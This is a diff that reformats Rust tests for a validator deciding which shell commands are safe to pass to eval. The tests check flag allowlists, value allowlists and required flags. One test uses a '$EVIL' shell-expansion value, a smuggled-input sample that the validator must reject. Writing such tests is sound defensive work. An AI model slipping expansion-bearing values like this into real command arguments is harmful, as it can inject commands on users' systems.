+        panic!("expected branching kind");
+    };
+    let init = subs.iter().find(|s| s.name == "init").expect("init sub");
+    assert!(init.eval_safe);
+}
 
-    #[test]
-    fn eval_safe_on_leaf_sub_builds() {
-        let spec = load_one(r#"
+#[test]
+fn eval_safe_on_leaf_sub_builds() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6003,26 +5613,28 @@ valued = ["--type"]
             standalone = ["--shims"]
             eval_safe = true
             eval_safe_flags = ["--shims"]
-        "#);
-        // The walker tests live in src/tests.rs and exercise the full
-        // path; here we only confirm the build succeeds for a tagged
-        // leaf sub.
-        let DispatchKind::Branching { subs, .. } = &spec.kind else {
-            panic!("expected branching kind, got {:?}", spec.kind);
-        };
-        let init = subs.iter().find(|s| s.name == "init").expect("init sub");
-        assert!(init.eval_safe);
-        assert_eq!(init.eval_safe_flags, vec!["--shims".to_string()]);
-    }
+        "#,
+    );
+    // The walker tests live in src/tests.rs and exercise the full
+    // path; here we only confirm the build succeeds for a tagged
+    // leaf sub.
+    let DispatchKind::Branching { subs, .. } = &spec.kind else {
+        panic!("expected branching kind, got {:?}", spec.kind);
+    };
+    let init = subs.iter().find(|s| s.name == "init").expect("init sub");
+    assert!(init.eval_safe);
+    assert_eq!(init.eval_safe_flags, vec!["--shims".to_string()]);
+}
 
-    // Walker descent — Branching and Custom kinds
+// Walker descent — Branching and Custom kinds
 
-    /// A tagged leaf sub inside a handler-based (Custom kind) command is
-    /// reached by the walker. Before Gap A this descent silently failed
-    /// because the walker only matched `Branching`.
-    #[test]
-    fn walker_descends_custom_subs() {
-        let spec = load_one(r#"
+/// A tagged leaf sub inside a handler-based (Custom kind) command is
+/// reached by the walker. Before Gap A this descent silently failed
+/// because the walker only matched `Branching`.
+#[test]
+fn walker_descends_custom_subs() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "php"
             handler = "php"
@@ -6032,16 +5644,18 @@ valued = ["--type"]
             bare = true
             max_positional = 0
             eval_safe = true
-        "#);
-        assert!(matches!(spec.kind, DispatchKind::Custom { .. }));
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["php", "demo-init"])));
-    }
+        "#,
+    );
+    assert!(matches!(spec.kind, DispatchKind::Custom { .. }));
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["php", "demo-init"])));
+}
 
-    /// Untagged subs inside a Custom kind do NOT inherit the parent's
-    /// status. The walker descends to the leaf and finds it untagged.
-    #[test]
-    fn walker_custom_untagged_sub_denied() {
-        let spec = load_one(r#"
+/// Untagged subs inside a Custom kind do NOT inherit the parent's
+/// status. The walker descends to the leaf and finds it untagged.
+#[test]
+fn walker_custom_untagged_sub_denied() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "php"
             handler = "php"
@@ -6050,16 +5664,18 @@ valued = ["--type"]
             name = "demo-init"
             bare = true
             max_positional = 0
-        "#);
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["php", "demo-init"])));
-    }
+        "#,
+    );
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["php", "demo-init"])));
+}
 
-    /// Walker descent through Custom must behave identically to Branching
-    /// when the sub structure is the same. This isolates the descent
-    /// change from any unintended behavior shift.
-    #[test]
-    fn walker_branching_and_custom_descent_agree() {
-        let branching = load_one(r#"
+/// Walker descent through Custom must behave identically to Branching
+/// when the sub structure is the same. This isolates the descent
+/// change from any unintended behavior shift.
+#[test]
+fn walker_branching_and_custom_descent_agree() {
+    let branching = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6068,8 +5684,10 @@ valued = ["--type"]
             bare = true
             max_positional = 0
             eval_safe = true
-        "#);
-        let custom = load_one(r#"
+        "#,
+    );
+    let custom = load_one(
+        r#"
             [[command]]
             name = "demo"
             handler = "php"
@@ -6079,45 +5697,48 @@ valued = ["--type"]
             bare = true
             max_positional = 0
             eval_safe = true
-        "#);
-        for tail in [vec!["init"], vec!["init", "x"], vec!["other"], vec![]] {
-            let mut tokens = vec!["demo"];
-            tokens.extend(tail.iter().copied());
-            let parsed = toks(&tokens);
-            assert_eq!(
-                super::is_eval_safe_for_spec(&branching, &parsed),
-                super::is_eval_safe_for_spec(&custom, &parsed),
-                "descent disagrees for tail {tail:?}",
-            );
-        }
+        "#,
+    );
+    for tail in [vec!["init"], vec!["init", "x"], vec!["other"], vec![]] {
+        let mut tokens = vec!["demo"];
+        tokens.extend(tail.iter().copied());
+        let parsed = toks(&tokens);
+        assert_eq!(
+            super::is_eval_safe_for_spec(&branching, &parsed),
+            super::is_eval_safe_for_spec(&custom, &parsed),
+            "descent disagrees for tail {tail:?}",
+        );
     }
+}
 
-    /// Empty token list never returns true (defense in depth — caller
-    /// shouldn't pass empties but we guarantee the answer regardless).
-    #[test]
-    fn walker_empty_tokens_returns_false() {
-        let spec = load_one(r#"
+/// Empty token list never returns true (defense in depth — caller
+/// shouldn't pass empties but we guarantee the answer regardless).
+#[test]
+fn walker_empty_tokens_returns_false() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
             bare = true
             eval_safe = true
-        "#);
-        assert!(!super::is_eval_safe_for_spec(&spec, &[]));
-    }
+        "#,
+    );
+    assert!(!super::is_eval_safe_for_spec(&spec, &[]));
+}
 
-    proptest::proptest! {
-        /// For any spec built from a tagged sub-only TOML, the walker
-        /// returns true iff the tokens exactly traverse to the tagged
-        /// sub and the tail satisfies the flag allowlist. We model the
-        /// tail as a single shell-name positional plus a subset of the
-        /// allowed flags — both should always be eval-safe.
-        #[test]
-        fn walker_accepts_traversal_to_tagged_leaf(
-            shell in proptest::string::string_regex("[a-z]{1,8}").expect("regex"),
-            extra_flags in proptest::collection::vec(proptest::sample::select(vec!["--alpha", "--beta", "--gamma"]), 0..4),
-        ) {
-            let spec = load_one(r#"
+proptest::proptest! {
+    /// For any spec built from a tagged sub-only TOML, the walker
+    /// returns true iff the tokens exactly traverse to the tagged
+    /// sub and the tail satisfies the flag allowlist. We model the
+    /// tail as a single shell-name positional plus a subset of the
+    /// allowed flags — both should always be eval-safe.
+    #[test]
+    fn walker_accepts_traversal_to_tagged_leaf(
+        shell in proptest::string::string_regex("[a-z]{1,8}").expect("regex"),
+        extra_flags in proptest::collection::vec(proptest::sample::select(vec!["--alpha", "--beta", "--gamma"]), 0..4),
+    ) {
+        let spec = load_one(r#"
                 [[command]]
                 name = "demo"
                 researched_version = "v1.0"
@@ -6129,24 +5750,24 @@ valued = ["--type"]
                 eval_safe = true
                 eval_safe_flags = ["--alpha", "--beta", "--gamma"]
             "#);
-            let mut words = vec!["demo".to_string(), "init".to_string(), shell.clone()];
-            for f in &extra_flags { words.push((*f).to_string()); }
-            let tokens: Vec<Token> = words.iter().map(|s| Token::from_test(s.as_str())).collect();
-            proptest::prop_assert!(
-                super::is_eval_safe_for_spec(&spec, &tokens),
-                "walker rejected legal traversal: {words:?}"
-            );
-        }
+        let mut words = vec!["demo".to_string(), "init".to_string(), shell.clone()];
+        for f in &extra_flags { words.push((*f).to_string()); }
+        let tokens: Vec<Token> = words.iter().map(|s| Token::from_test(s.as_str())).collect();
+        proptest::prop_assert!(
+            super::is_eval_safe_for_spec(&spec, &tokens),
+            "walker rejected legal traversal: {words:?}"
+        );
+    }
 
-        /// For any spec whose tagged sub's eval_safe_flags is empty, ANY
-        /// flag in the substituted tail is denied. This is the
-        /// allowlist-only invariant: presence-of-tag alone never opens
-        /// the flag surface.
-        #[test]
-        fn walker_rejects_any_flag_when_allowlist_empty(
-            flag in proptest::sample::select(vec!["--anything", "--help", "-v", "-h", "--evil"]),
-        ) {
-            let spec = load_one(r#"
+    /// For any spec whose tagged sub's eval_safe_flags is empty, ANY
+    /// flag in the substituted tail is denied. This is the
+    /// allowlist-only invariant: presence-of-tag alone never opens
+    /// the flag surface.
+    #[test]
+    fn walker_rejects_any_flag_when_allowlist_empty(
+        flag in proptest::sample::select(vec!["--anything", "--help", "-v", "-h", "--evil"]),
+    ) {
+        let spec = load_one(r#"
                 [[command]]
                 name = "demo"
                 researched_version = "v1.0"
@@ -6156,18 +5777,19 @@ valued = ["--type"]
                 max_positional = 0
                 eval_safe = true
             "#);
-            let tokens = toks(&["demo", "init", flag]);
-            proptest::prop_assert!(
-                !super::is_eval_safe_for_spec(&spec, &tokens),
-                "walker accepted flag despite empty allowlist: {flag}"
-            );
-        }
+        let tokens = toks(&["demo", "init", flag]);
+        proptest::prop_assert!(
+            !super::is_eval_safe_for_spec(&spec, &tokens),
+            "walker accepted flag despite empty allowlist: {flag}"
+        );
     }
+}
 
-    // Per-flag value allowlist (Gap C)
+// Per-flag value allowlist (Gap C)
 
-    fn aws_export_credentials_spec() -> CommandSpec {
-        load_one(r#"
+fn aws_export_credentials_spec() -> CommandSpec {
+    load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6182,78 +5804,74 @@ valued = ["--type"]
             [command.sub.eval_safe_flag_values]
             --format = ["env", "env-no-export", "fish", "powershell", "windows-cmd"]
             --profile = []
-        "#)
-    }
+        "#,
+    )
+}
 
-    #[test]
-    fn flag_value_allowlist_accepts_listed_value_space_form() {
-        let spec = aws_export_credentials_spec();
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "env"])));
-    }
+#[test]
+fn flag_value_allowlist_accepts_listed_value_space_form() {
+    let spec = aws_export_credentials_spec();
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "env"])));
+}
 
-    #[test]
-    fn flag_value_allowlist_accepts_listed_value_eq_form() {
-        let spec = aws_export_credentials_spec();
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=env"])));
-    }
+#[test]
+fn flag_value_allowlist_accepts_listed_value_eq_form() {
+    let spec = aws_export_credentials_spec();
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=env"])));
+}
 
-    #[test]
-    fn flag_value_allowlist_rejects_unlisted_value() {
-        let spec = aws_export_credentials_spec();
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "json"])));
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=json"])));
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=process"])));
-    }
+#[test]
+fn flag_value_allowlist_rejects_unlisted_value() {
+    let spec = aws_export_credentials_spec();
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "json"])));
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=json"])));
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=process"])));
+}
 
-    #[test]
-    fn flag_value_allowlist_rejects_missing_value() {
-        let spec = aws_export_credentials_spec();
-        // --format with no following token is denied — the flag is
-        // structurally valued in eval_safe_flag_values.
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format"])));
-    }
+#[test]
+fn flag_value_allowlist_rejects_missing_value() {
+    let spec = aws_export_credentials_spec();
+    // --format with no following token is denied — the flag is
+    // structurally valued in eval_safe_flag_values.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format"])));
+}
 
-    #[test]
-    fn flag_value_allowlist_rejects_empty_value() {
-        let spec = aws_export_credentials_spec();
-        // Empty value via either form is denied for any valued flag
-        // declared in eval_safe_flag_values — including the
-        // explicit-unrestricted `--profile = []` posture. The bare-
-        // literal alphabet check vacuously passes empty strings, so
-        // the walker has to reject explicitly.
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format="])));
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", ""])));
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile="])));
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", ""])));
-    }
+#[test]
+fn flag_value_allowlist_rejects_empty_value() {
+    let spec = aws_export_credentials_spec();
+    // Empty value via either form is denied for any valued flag
+    // declared in eval_safe_flag_values — including the
+    // explicit-unrestricted `--profile = []` posture. The bare-
+    // literal alphabet check vacuously passes empty strings, so
+    // the walker has to reject explicitly.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format="])));
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", ""])));
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile="])));
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", ""])));
+}
 
-    #[test]
-    fn flag_value_allowlist_does_not_affect_other_flags() {
-        let spec = aws_export_credentials_spec();
-        // --profile is allowed without value-checking (not in
-        // eval_safe_flag_values); any value reaching the walker is OK
-        // because the bare-literal alphabet was checked upstream.
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev"])));
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile=dev"])));
-    }
+#[test]
+fn flag_value_allowlist_does_not_affect_other_flags() {
+    let spec = aws_export_credentials_spec();
+    // --profile is allowed without value-checking (not in
+    // eval_safe_flag_values); any value reaching the walker is OK
+    // because the bare-literal alphabet was checked upstream.
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev"])));
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile=dev"])));
+}
 
-    #[test]
-    fn flag_value_allowlist_combines_with_other_flags() {
-        let spec = aws_export_credentials_spec();
-        assert!(super::is_eval_safe_for_spec(
-            &spec,
-            &toks(&["demo", "export", "--format", "env", "--profile", "dev"]),
-        ));
-        // Bad value still denies, even with other valid flags present.
-        assert!(!super::is_eval_safe_for_spec(
-            &spec,
-            &toks(&["demo", "export", "--profile", "dev", "--format", "json"]),
-        ));
-    }
+#[test]
+fn flag_value_allowlist_combines_with_other_flags() {
+    let spec = aws_export_credentials_spec();
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "env", "--profile", "dev"]),));
+    // Bad value still denies, even with other valid flags present.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev", "--format", "json"]),));
+}
 
-    #[test]
-    fn flag_value_without_flag_in_allowlist_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn flag_value_without_flag_in_allowlist_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6266,12 +5884,15 @@ valued = ["--type"]
             eval_safe_flags = ["--profile"]
             [command.sub.eval_safe_flag_values]
             --format = ["env"]
-        "#, "eval_safe_flag_values` but not in `eval_safe_flags");
-    }
+        "#,
+        "eval_safe_flag_values` but not in `eval_safe_flags",
+    );
+}
 
-    #[test]
-    fn flag_value_with_expansion_trigger_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn flag_value_with_expansion_trigger_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6284,22 +5905,24 @@ valued = ["--type"]
             eval_safe_flags = ["--format"]
             [command.sub.eval_safe_flag_values]
             --format = ["$EVIL"]
-        "#, "characters outside `[a-zA-Z0-9_./=-]");
-    }
+        "#,
+        "characters outside `[a-zA-Z0-9_./=-]",
+    );
+}
 
-    proptest::proptest! {
-        /// For any spec with `eval_safe_flag_values = {"--format": [<set>]}`,
-        /// only values in the set are accepted, regardless of form
-        /// (space-separated or `=`-joined). Generated test values are
-        /// constrained to the bare-literal alphabet to bypass the
-        /// upstream alphabet check.
-        #[test]
-        fn walker_value_allowlist_is_exhaustive(
-            value in proptest::string::string_regex("[a-z]{1,8}").expect("regex"),
-            form in proptest::sample::select(vec!["space", "eq"]),
-        ) {
-            let allowed_values = ["env", "json", "fish", "windows-cmd"];
-            let spec = load_one(r#"
+proptest::proptest! {
+    /// For any spec with `eval_safe_flag_values = {"--format": [<set>]}`,
+    /// only values in the set are accepted, regardless of form
+    /// (space-separated or `=`-joined). Generated test values are
+    /// constrained to the bare-literal alphabet to bypass the
+    /// upstream alphabet check.
+    #[test]
+    fn walker_value_allowlist_is_exhaustive(
+        value in proptest::string::string_regex("[a-z]{1,8}").expect("regex"),
+        form in proptest::sample::select(vec!["space", "eq"]),
+    ) {
+        let allowed_values = ["env", "json", "fish", "windows-cmd"];
+        let spec = load_one(r#"
                 [[command]]
                 name = "demo"
                 researched_version = "v1.0"
@@ -6313,25 +5936,26 @@ valued = ["--type"]
                 [command.sub.eval_safe_flag_values]
                 --format = ["env", "json", "fish", "windows-cmd"]
             "#);
-            let tokens = match form {
-                "eq" => toks(&["demo", "export", &format!("--format={value}")]),
-                _ => toks(&["demo", "export", "--format", &value]),
-            };
-            let expected = allowed_values.contains(&value.as_str());
-            let actual = super::is_eval_safe_for_spec(&spec, &tokens);
-            proptest::prop_assert_eq!(
-                actual,
-                expected,
-                "walker disagreed for value {:?} (form={}): expected {}, got {}",
-                value, form, expected, actual,
-            );
-        }
+        let tokens = match form {
+            "eq" => toks(&["demo", "export", &format!("--format={value}")]),
+            _ => toks(&["demo", "export", "--format", &value]),
+        };
+        let expected = allowed_values.contains(&value.as_str());
+        let actual = super::is_eval_safe_for_spec(&spec, &tokens);
+        proptest::prop_assert_eq!(
+            actual,
+            expected,
+            "walker disagreed for value {:?} (form={}): expected {}, got {}",
+            value, form, expected, actual,
+        );
     }
+}
 
-    // Required-flag-from-set (Gap B)
+// Required-flag-from-set (Gap B)
 
-    fn fzf_shell_init_spec() -> CommandSpec {
-        load_one(r#"
+fn fzf_shell_init_spec() -> CommandSpec {
+    load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6341,38 +5965,37 @@ valued = ["--type"]
             eval_safe = true
             eval_safe_flags = ["--bash", "--zsh", "--fish", "--nushell"]
             eval_safe_required_flags = ["--bash", "--zsh", "--fish", "--nushell"]
-        "#)
-    }
+        "#,
+    )
+}
 
-    #[test]
-    fn required_flags_bare_invocation_denied() {
-        let spec = fzf_shell_init_spec();
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo"])));
-    }
+#[test]
+fn required_flags_bare_invocation_denied() {
+    let spec = fzf_shell_init_spec();
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo"])));
+}
 
-    #[test]
-    fn required_flags_one_present_allowed() {
-        let spec = fzf_shell_init_spec();
-        for flag in ["--bash", "--zsh", "--fish", "--nushell"] {
-            assert!(
-                super::is_eval_safe_for_spec(&spec, &toks(&["demo", flag])),
-                "{flag} should satisfy required-flag check",
-            );
-        }
+#[test]
+fn required_flags_one_present_allowed() {
+    let spec = fzf_shell_init_spec();
+    for flag in ["--bash", "--zsh", "--fish", "--nushell"] {
+        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", flag])), "{flag} should satisfy required-flag check",);
     }
+}
 
-    #[test]
-    fn required_flags_two_present_allowed() {
-        let spec = fzf_shell_init_spec();
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash", "--zsh"])));
-    }
+#[test]
+fn required_flags_two_present_allowed() {
+    let spec = fzf_shell_init_spec();
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash", "--zsh"])));
+}
 
-    #[test]
-    fn required_flags_unrelated_allowed_flag_denied() {
-        // Allowlist a "harmless" flag alongside the required set, but
-        // require one of the init flags. An invocation with only the
-        // harmless flag should still be denied.
-        let spec = load_one(r#"
+#[test]
+fn required_flags_unrelated_allowed_flag_denied() {
+    // Allowlist a "harmless" flag alongside the required set, but
+    // require one of the init flags. An invocation with only the
+    // harmless flag should still be denied.
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6382,18 +6005,20 @@ valued = ["--type"]
             eval_safe = true
             eval_safe_flags = ["--bash", "--zsh", "--verbose"]
             eval_safe_required_flags = ["--bash", "--zsh"]
-        "#);
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash"])));
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash", "--verbose"])));
-        // --verbose alone misses the required set.
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--verbose"])));
-    }
+        "#,
+    );
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash"])));
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash", "--verbose"])));
+    // --verbose alone misses the required set.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--verbose"])));
+}
 
-    #[test]
-    fn required_flags_empty_does_not_constrain() {
-        // Default behavior (mise activate shape): empty required_flags
-        // means bare invocation is fine.
-        let spec = load_one(r#"
+#[test]
+fn required_flags_empty_does_not_constrain() {
+    // Default behavior (mise activate shape): empty required_flags
+    // means bare invocation is fine.
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6402,13 +6027,15 @@ valued = ["--type"]
             bare = true
             max_positional = 0
             eval_safe = true
-        "#);
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "activate"])));
-    }
+        "#,
+    );
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "activate"])));
+}
 
-    #[test]
-    fn required_flag_not_in_allowlist_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn required_flag_not_in_allowlist_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6418,49 +6045,52 @@ valued = ["--type"]
             eval_safe = true
             eval_safe_flags = ["--bash"]
             eval_safe_required_flags = ["--bash", "--zsh"]
-        "#, "eval_safe_required_flags` but not in `eval_safe_flags");
-    }
+        "#,
+        "eval_safe_required_flags` but not in `eval_safe_flags",
+    );
+}
 
-    proptest::proptest! {
-        /// For any spec with `eval_safe_required_flags = [...]`, the
-        /// walker accepts iff at least one of those flags is present
-        /// in the invocation (and every flag is in the allowlist).
-        /// We model the invocation as a random subset of the allowed
-        /// flags.
-        #[test]
-        fn walker_required_flag_invariant(
-            include_bash in proptest::bool::ANY,
-            include_zsh in proptest::bool::ANY,
-            include_fish in proptest::bool::ANY,
-            include_nushell in proptest::bool::ANY,
-        ) {
-            let spec = fzf_shell_init_spec();
-            let mut words = vec!["demo"];
-            if include_bash { words.push("--bash"); }
-            if include_zsh { words.push("--zsh"); }
-            if include_fish { words.push("--fish"); }
-            if include_nushell { words.push("--nushell"); }
-            let any_present = include_bash || include_zsh || include_fish || include_nushell;
-            let tokens = toks(&words);
-            let actual = super::is_eval_safe_for_spec(&spec, &tokens);
-            proptest::prop_assert_eq!(
-                actual,
-                any_present,
-                "walker disagreed for {:?}: expected {}, got {}",
-                words, any_present, actual,
-            );
-        }
-    }
-
-    // Adversarial-review hardening (must-fix #1, H3, H4)
-
-    /// Must-fix #1: a valued flag tagged eval-safe without an entry in
-    /// `eval_safe_flag_values` panics at build time. This catches the
-    /// aws v0.196.0 near-miss pattern where `--format` defaulting to
-    /// `process` (JSON) would substitute JSON into eval.
+proptest::proptest! {
+    /// For any spec with `eval_safe_required_flags = [...]`, the
+    /// walker accepts iff at least one of those flags is present
+    /// in the invocation (and every flag is in the allowlist).
+    /// We model the invocation as a random subset of the allowed
+    /// flags.
     #[test]
-    fn valued_flag_without_value_posture_is_rejected_on_a_sub() {
-        assert_rejected(r#"
+    fn walker_required_flag_invariant(
+        include_bash in proptest::bool::ANY,
+        include_zsh in proptest::bool::ANY,
+        include_fish in proptest::bool::ANY,
+        include_nushell in proptest::bool::ANY,
+    ) {
+        let spec = fzf_shell_init_spec();
+        let mut words = vec!["demo"];
+        if include_bash { words.push("--bash"); }
+        if include_zsh { words.push("--zsh"); }
+        if include_fish { words.push("--fish"); }
+        if include_nushell { words.push("--nushell"); }
+        let any_present = include_bash || include_zsh || include_fish || include_nushell;
+        let tokens = toks(&words);
+        let actual = super::is_eval_safe_for_spec(&spec, &tokens);
+        proptest::prop_assert_eq!(
+            actual,
+            any_present,
+            "walker disagreed for {:?}: expected {}, got {}",
+            words, any_present, actual,
+        );
+    }
+}
+
+// Adversarial-review hardening (must-fix #1, H3, H4)
+
+/// Must-fix #1: a valued flag tagged eval-safe without an entry in
+/// `eval_safe_flag_values` panics at build time. This catches the
+/// aws v0.196.0 near-miss pattern where `--format` defaulting to
+/// `process` (JSON) would substitute JSON into eval.
+#[test]
+fn valued_flag_without_value_posture_is_rejected_on_a_sub() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6471,13 +6101,16 @@ valued = ["--type"]
             valued = ["--format"]
             eval_safe = true
             eval_safe_flags = ["--format"]
-        "#, "Every valued flag tagged eval-safe must declare its value posture");
-    }
+        "#,
+        "Every valued flag tagged eval-safe must declare its value posture",
+    );
+}
 
-    /// Same check applied at command level for flat commands.
-    #[test]
-    fn valued_flag_without_value_posture_is_rejected_at_command_level() {
-        assert_rejected(r#"
+/// Same check applied at command level for flat commands.
+#[test]
+fn valued_flag_without_value_posture_is_rejected_at_command_level() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6485,17 +6118,20 @@ valued = ["--type"]
             valued = ["--format"]
             eval_safe = true
             eval_safe_flags = ["--format"]
-        "#, "Every valued flag tagged eval-safe must declare its value posture");
-    }
+        "#,
+        "Every valued flag tagged eval-safe must declare its value posture",
+    );
+}
 
-    /// Explicit-unrestricted form (`= []`) is the documented opt-out
-    /// for valued flags whose value doesn't affect stdout shape (like
-    /// `--profile NAME`). The build must accept this — it's the
-    /// contributor declaring "I considered this and decided no value
-    /// allowlist is needed."
-    #[test]
-    fn valued_flag_explicit_unrestricted_builds() {
-        let spec = load_one(r#"
+/// Explicit-unrestricted form (`= []`) is the documented opt-out
+/// for valued flags whose value doesn't affect stdout shape (like
+/// `--profile NAME`). The build must accept this — it's the
+/// contributor declaring "I considered this and decided no value
+/// allowlist is needed."
+#[test]
+fn valued_flag_explicit_unrestricted_builds() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6508,24 +6144,26 @@ valued = ["--type"]
             eval_safe_flags = ["--profile"]
             [command.sub.eval_safe_flag_values]
             --profile = []
-        "#);
-        // Walker accepts any bare-literal value for the unrestricted flag.
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev"])));
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile=staging"])));
-        // But the flag is still structurally valued: missing value denies.
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile"])));
-    }
+        "#,
+    );
+    // Walker accepts any bare-literal value for the unrestricted flag.
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev"])));
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile=staging"])));
+    // But the flag is still structurally valued: missing value denies.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile"])));
+}
 
-    /// H3: combined short-flag clusters (`-sk`) are intentionally
-    /// denied even when the individual flags are tagged. The walker
-    /// compares the whole token `-sk` against `eval_safe_flags`; it
-    /// never matches the entries `-s` and `-k` separately. This
-    /// matters because cluster parsing has subtle order-dependent
-    /// semantics across tools and the eval-safe contract should be
-    /// "the exact flag-token the contributor vetted, not a cluster."
-    #[test]
-    fn walker_denies_combined_short_cluster() {
-        let spec = load_one(r#"
+/// H3: combined short-flag clusters (`-sk`) are intentionally
+/// denied even when the individual flags are tagged. The walker
+/// compares the whole token `-sk` against `eval_safe_flags`; it
+/// never matches the entries `-s` and `-k` separately. This
+/// matters because cluster parsing has subtle order-dependent
+/// semantics across tools and the eval-safe contract should be
+/// "the exact flag-token the contributor vetted, not a cluster."
+#[test]
+fn walker_denies_combined_short_cluster() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -6533,43 +6171,45 @@ valued = ["--type"]
             standalone = ["-s", "-k", "-sk"]
             eval_safe = true
             eval_safe_flags = ["-s", "-k"]
-        "#);
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-s"])));
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-k"])));
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-s", "-k"])));
-        // Clustering: walker compares "-sk" against eval_safe_flags
-        // which has individual "-s" and "-k". Whole-token mismatch =>
-        // deny. Even though the dispatcher would accept (if the
-        // contributor added "-sk" to standalone), the walker says no.
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-sk"])));
-    }
+        "#,
+    );
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-s"])));
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-k"])));
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-s", "-k"])));
+    // Clustering: walker compares "-sk" against eval_safe_flags
+    // which has individual "-s" and "-k". Whole-token mismatch =>
+    // deny. Even though the dispatcher would accept (if the
+    // contributor added "-sk" to standalone), the walker says no.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-sk"])));
+}
 
-    // H2 (clarification): the walker is intentionally INDEPENDENT of
-    // dispatcher constraints like max_positional. Eval-safety is
-    // gated end-to-end by `cst/check.rs::eval_verdict`, which runs
-    // `word_sub_verdict` (full dispatcher validation) BEFORE the
-    // walker. By the time the walker runs, the dispatcher has
-    // already accepted the invocation. The walker only adds the
